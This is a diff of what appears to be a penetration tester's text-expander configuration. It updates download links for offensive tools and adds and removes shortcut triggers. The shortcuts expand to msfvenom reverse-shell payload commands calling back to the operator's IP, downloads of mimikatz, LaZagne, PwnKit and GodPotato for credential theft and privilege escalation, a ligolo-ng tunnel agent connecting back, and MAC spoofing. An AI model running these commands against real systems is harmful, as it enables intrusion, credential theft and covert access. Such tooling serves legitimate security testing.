@@ -39,8 +39,8 @@ matches:
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe >/dev/null &
       msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=443 -f psh >/dev/null &
       cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
-      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh &
-      wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20240818-ea81ae32/winPEASany.exe -O winpeas.exe &
+      wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20250401-a1b119bc/linpeas.sh -O lp.sh &
+      wget -q https://github.com/peass-ng/PEASS-ng/releases/download/20250401-a1b119bc/winPEASany.exe -O winpeas.exe &
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
@@ -52,13 +52,19 @@ matches:
       wget -q https://download.sysinternals.com/files/SysinternalsSuite.zip && unzip SysinternalsSuite.zip &
       wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
       wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit & 
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &                                                                 
-      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &  
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.7.5_linux_amd64.tar.gz &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip && unzip -o ligolo-ng_agent_0.7.5_windows_amd64.zip &
       wget -q https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe &
       git clone https://github.com/Flangvik/SharpCollection.git &
       git clone https://github.com/gerbsec/RedTeam-TradeCraft.git &                                                                
       python3 -m http.server 80
+
+  - trigger: ":pyenv"
+    replace: python3 -m venv .venv;source .venv/bin/activate
+
+  - trigger: ":cleanpyenv"
+    replace: deactivate; rm -rf .venv
 
   - trigger: ":msfwin"
     replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe  LHOST=
@@ -118,18 +124,12 @@ matches:
 
   - trigger: ":dirsearch"
     replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u {{clipboard}}"
-    
-  - trigger: ":dirsearch2"
-    replace: "dirsearch -w /usr/share/wordlists/dirb/common.txt -t 64 -e php,txt,html -f -u {{clipboard}}"   
-
-  - trigger: ":dirsearch3"
-    replace: "dirsearch -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 64 -e php,txt,html -f -u {{clipboard}}"
-    
+     
   - trigger: ":findext"
     replace: "ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://{{clipboard}}/blog/indexFUZZ"
 
   - trigger: ":xfreerdp"
-    replace: "xfreerdp /dynamic-resolution /cert-ignore /compression /auto-reconnect /v:{{clipboard}} /u:user /p:pass "
+    replace: "xfreerdp3 /dynamic-resolution /compression /auto-reconnect /v:{{clipboard}} /u:user /p:pass /drive:.,linux"
 
   - trigger: ":nuclei"
     replace: "nuclei -c 50 -retries 3 -u {{clipboard}}"
@@ -188,7 +188,7 @@ matches:
     replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:443
 
   - trigger: ":aligolo"
-    replace: ./agent -connect {{IP}}:443 -ignore-cert
+    replace: .\agent.exe -connect {{IP}}:443 -ignore-cert
 
   - trigger: ":rligolo"
     replace: sudo ip route add 192.168.110.0/24 dev ligolo
@@ -225,4 +225,3 @@ matches:
 
   - trigger: ":spoofmac"
     replace: macchanger -A wlan0mon
-    
